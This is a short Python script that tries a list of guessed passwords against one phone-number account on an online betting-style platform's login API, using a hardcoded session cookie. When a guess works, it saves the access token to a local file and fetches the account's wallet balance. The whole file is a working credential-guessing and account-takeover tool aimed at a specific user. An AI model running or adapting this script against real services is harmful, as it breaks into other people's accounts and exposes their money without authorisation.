#!/usr/bin/env python3
"""probe_reauth.py — Try new credentials for vak88z2 player."""
import json, pathlib, requests, base64, time

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

CREDS = [
    ("0972571110", "Pwned2026!"),
    ("0972571110", "Aa112233"),
    ("0972571110", "Aa112233!"),
    ("0972571110", "Vak88z!"),
    ("0972571110", "vak88"),
    ("0972571110", "123456"),
]

def try_auth(username, password):
    try:
        r = requests.post(f"{PBAPI}/pb/authentication",
                          headers={"Content-Type": "application/json",
                                   "Cookie": f"AWSALB={AWSALB}"},
                          json={"strategy": "local", "username": username,
                                "password": password},
                          timeout=15)
        if r.status_code in (200, 201) and "accessToken" in r.text:
            jwt = r.json().get("accessToken", "")
            pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").write_text(jwt)
            # decode exp
            parts = jwt.split(".")
            pad = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(pad))
            exp_in = payload.get("exp", 0) - time.time()
            return f"[!!!] SUCCESS JWT exp in {exp_in/3600:.1f}h — saved"
        else:
            msg = r.json().get("message", {})
            en = msg.get("en", r.text[:80]) if isinstance(msg, dict) else str(msg)[:80]
            return f"HTTP {r.status_code}: {en}"
    except Exception as e:
        return f"ERR: {e}"

for u, p in CREDS:
    result = try_auth(u, p)
    print(f"  {u}:{p} → {result}")
    if "SUCCESS" in result:
        # verify wallet
        jwt = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
        r2 = requests.get(f"{MGAPI}/mb/wallet",
                          headers={"Authorization": f"Bearer {jwt}", "template": "vn",
                                   "Cookie": f"AWSALB={AWSALB}"},
                          timeout=10)
        bal = r2.json().get("balance", "?") if r2.ok else f"ERR:{r2.status_code}"
        print(f"  wallet: {bal}")
        break
